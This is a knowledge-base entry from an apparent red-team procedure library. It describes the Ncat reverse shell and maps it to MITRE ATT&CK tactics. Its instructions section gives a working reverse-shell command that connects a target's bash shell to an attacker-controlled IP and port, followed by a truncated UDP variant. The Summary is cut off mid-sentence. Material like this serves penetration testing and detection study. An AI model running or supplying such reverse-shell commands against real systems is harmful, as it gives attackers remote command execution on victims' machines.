---
id: 0fa412e0-dfe0-4a8f-9b9c-3cb9c1b8c5e2
name: Ncat Reverse Shell
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:24.425390+00:00'
updated_at: '2023-04-10T20:25:23.129155+00:00'
tactics:
- '[[Command and Control|TA0011 - Command and Control]]'
- '[[Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
- '[[Custom Cryptographic Protocol|T1024 - Custom Cryptographic Protocol]]'
- '[[Remote Services|T1021 - Remote Services]]'
tags:
- '[[Ncat]]'
- '[[Reverse Shell]]'
- '[[Reverse Shell Cheat Sheet]]'
---

# Ncat Reverse Shell

## Summary

The Ncat reverse shell is a technique used by attackers to gain remote shell access to a target system. This technique involves establishing a connection from the target system to an attacker-controlled system, allowing the attacker to execute commands on the target system. This can be useful for m

## Description

# Description

The Ncat reverse shell is a technique used by attackers to gain remote shell access to a target system. This technique involves establishing a connection from the target system to an attacker-controlled system, allowing the attacker to execute commands on the target system. This can be useful for maintaining persistence, exfiltrating data, and performing other malicious activities. Ncat is a command-line utility that provides a powerful and flexible way to create reverse shells.

 

## Requirements

1. Access to a system with Ncat installed

1. Network connectivity between the attacker and target systems

 

## Defense

1. Implement network segmentation to prevent attackers from accessing critical systems

1. Use strong authentication mechanisms to prevent unauthorized access to systems

1. Monitor network traffic for signs of suspicious activity, such as unusual connections or data exfiltration

 

## Objectives

1. Gain remote shell access to a target system

1. Execute commands on the target system

1. Maintain persistence on the target system

 

# Instructions

1. This command allows you to access a remote shell on a target machine. The '-e' option specifies the command to be executed on the remote machine after establishing the connection. The '--udp' option can be used to establish a UDP connection instead of TCP.

 



**Code**: [[ncat 10.0.0.1 4242 -e /bin/bash
ncat --udp 10.0.0.]]



> The 'ncat' command is used for network connections. In this case, it is used to establish a connection to a remote machine at IP address 10.0.0.1 on port 4242. The '-e' option specifies the command to be executed on the remote machine after the connection is established. In this case, '/bin/bash' is executed which gives the user access to a remote shell. The '--udp' option can be used to establish a UDP connection instead of TCP. This can be useful in certain situations where TCP connections are blocked or not allowed.

## MITRE ATT&CK Mapping

### Tactics

- [[Command and Control|TA0011 - Command and Control]]
- [[Lateral Movement|TA0008 - Lateral Movement]]

### Techniques

- [[Custom Cryptographic Protocol|T1024 - Custom Cryptographic Protocol]]
- [[Remote Services|T1021 - Remote Services]]

## Tags

- [[Ncat]]
- [[Reverse Shell]]
- [[Reverse Shell Cheat Sheet]]


